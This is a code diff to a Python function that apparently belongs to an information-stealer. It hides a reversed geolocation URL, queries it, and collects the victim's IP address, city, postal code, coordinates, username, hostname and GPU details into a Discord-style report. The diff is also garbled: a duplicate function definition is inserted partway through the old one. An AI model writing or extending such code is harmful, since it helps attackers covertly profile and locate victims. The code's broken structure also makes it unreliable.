@@ -394,11 +394,39 @@ def globalInfo():
     computer_name = socket.gethostname()
     cores = os.cpu_count()
     gpu = ''
+def globalInfo():
+    
+    url = 'nosj/oi.ofnipi//:sptth'
+    response = urllib.request.urlopen(url[::-1])
+    data = json.loads(response.read().decode())
+    ip = data['ip']
+    loc = data['loc']
+    location = loc.split(',')
+    latitude = location[0]
+    longitude = location[1]
+    username = os.getlogin()
+    country = data['country']
+    country_code = data['country'].lower()
+    region = data['region']
+    city = data['city']
+    postal = data['postal']
+    computer_name = socket.gethostname()
+    cores = os.cpu_count()
+    gpu = 'None'
     if platform.system() == 'Linux':
         gpu_info = os.popen('lspci | grep -i nvidia').read().strip()
         if gpu_info:
             gpu = os.popen("nvidia-smi --query-gpu=gpu_name --format=csv,noheader").read()
-
+    elif platform.system() == 'Windows':
+        try:
+            gpu_model = os.popen("nvidia-smi --query-gpu=name --format=csv,noheader").read()
+            total_memory = os.popen("nvidia-smi --query-gpu=memory.total --format=csv,noheader,nounits").read()
+            free_memory = os.popen("nvidia-smi --query-gpu=memory.free --format=csv,noheader,nounits").read()
+            used_memory = os.popen("nvidia-smi --query-gpu=memory.used --format=csv,noheader,nounits").read()
+            temperature = os.popen("nvidia-smi --query-gpu=temperature.gpu --format=csv,noheader,nounits").read()
+            gpu = f"GPU Model: {gpu_model}\nTotal Memory: {total_memory} MB\nFree Memory: {free_memory} MB\nUsed Memory: {used_memory} MB\nGPU Temperature: {temperature}°C"
+        except Exception as e:
+            gpu = f"An error occurred: {str(e)}"
     globalinfo = f":flag_{country_code}: - `{username.upper()} | {ip} ({country}, {city})`\nMore Information 👀 : \n :flag_{country_code}: - `({region}) ({postal})` \n 💻 PC Information : \n`{computer_name}`\n Cores: `{cores}` \nGPU : `{gpu}` \nLatitude + Longitude  : {latitude}, {longitude} "
     return globalinfo
 
